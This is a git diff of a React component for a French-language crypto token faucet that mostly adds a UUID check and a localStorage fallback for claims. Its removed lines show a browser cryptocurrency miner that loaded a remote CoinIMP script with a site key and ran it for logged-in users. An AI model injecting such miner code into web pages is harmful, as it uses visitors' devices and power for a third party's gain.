@@ -27,26 +27,13 @@ export const FaucetClaim: React.FC<FaucetClaimProps> = ({ onOpenSpin }) => {
   const { toast } = useToast();
   const { user } = useAuth();
 
+  // UUID helper: detects proper UUID v1-5
+  const isUUID = (id: string) =>
+    /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(id);
+
   useEffect(() => {
     if (user) {
       checkClaimStatus();
-      // Inject mining script
-      const script1 = document.createElement('script');
-      script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
-      script1.async = true;
-      document.head.appendChild(script1);
-
-      script1.onload = () => {
-        const script2 = document.createElement('script');
-        script2.text = `
-          var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-            throttle: 0.2, c: 'w'
-          });
-          _client.start();
-          _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-        `;
-        document.head.appendChild(script2);
-      };
     }
   }, [user]);
 
@@ -74,7 +61,22 @@ export const FaucetClaim: React.FC<FaucetClaimProps> = ({ onOpenSpin }) => {
     if (!user) return;
 
     try {
-      // Use RPC to avoid TypeScript issues until types are regenerated
+      if (!isUUID(user.id)) {
+        // Local fallback for non-UUID users
+        const last = localStorage.getItem(`faucet_last_${user.id}`);
+        if (last) {
+          const nextClaim = new Date(last);
+          setNextClaimTime(nextClaim);
+          setCanClaim(new Date() >= nextClaim);
+        } else {
+          setCanClaim(true);
+        }
+        const total = Number(localStorage.getItem(`faucet_total_${user.id}`) || '0');
+        setTotalClaimed(total);
+        return;
+      }
+
+      // Supabase path for UUID users
       const { data, error } = await (supabase.rpc as any)('get_latest_faucet_claim', {
         p_user_id: user.id
       });
@@ -89,14 +91,12 @@ export const FaucetClaim: React.FC<FaucetClaimProps> = ({ onOpenSpin }) => {
         const latest = data[0];
         const nextClaim = new Date(latest.next_claim_at);
         const now = new Date();
-        
         setNextClaimTime(nextClaim);
         setCanClaim(now >= nextClaim);
       } else {
         setCanClaim(true);
       }
 
-      // Get total claimed
       const { data: totalData } = await (supabase.rpc as any)('get_total_faucet_claims', {
         p_user_id: user.id
       });
@@ -118,8 +118,27 @@ export const FaucetClaim: React.FC<FaucetClaimProps> = ({ onOpenSpin }) => {
       // Generate random amount between 0.00001 and 0.03
       const amount = Math.random() * (0.03 - 0.00001) + 0.00001;
       const roundedAmount = Math.round(amount * 100000) / 100000;
-      
-      // Use RPC function to handle claim creation and balance update
+
+      if (!isUUID(user.id)) {
+        // Local fallback: 15 minutes cooldown
+        const next = new Date(Date.now() + 15 * 60 * 1000);
+        localStorage.setItem(`faucet_last_${user.id}`, next.toISOString());
+        const prevTotal = Number(localStorage.getItem(`faucet_total_${user.id}`) || '0');
+        localStorage.setItem(`faucet_total_${user.id}`, String(prevTotal + roundedAmount));
+
+        setCanClaim(false);
+        setNextClaimTime(next);
+        setTotalClaimed(prevTotal + roundedAmount);
+
+        const diamondGain = 0.583;
+        toast({
+          title: "🎉 Faucet Claim Réussi!",
+          description: `Vous avez reçu ${roundedAmount.toFixed(5)} ZERO tokens + ${diamondGain} 💎 diamants!`,
+        });
+        return;
+      }
+
+      // Supabase path
       const { data, error } = await (supabase.rpc as any)('create_faucet_claim', {
         p_user_id: user.id,
         p_amount: roundedAmount
@@ -132,9 +151,7 @@ export const FaucetClaim: React.FC<FaucetClaimProps> = ({ onOpenSpin }) => {
         setNextClaimTime(new Date(data.next_claim_at));
         setTotalClaimed(prev => prev + roundedAmount);
 
-        // Gain de diamants pour le faucet claim
         const diamondGain = 0.583;
-
         toast({
           title: "🎉 Faucet Claim Réussi!",
           description: `Vous avez reçu ${roundedAmount.toFixed(5)} ZERO tokens + ${diamondGain} 💎 diamants!`,
@@ -174,9 +191,6 @@ export const FaucetClaim: React.FC<FaucetClaimProps> = ({ onOpenSpin }) => {
             <p className="text-muted-foreground">Réclamez des ZERO tokens toutes les 15 minutes!</p>
           </div>
           <div></div>
-        </div>
-        <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
-          ⚡ Section avec mining JavaScript actif
         </div>
       </CardHeader>
       
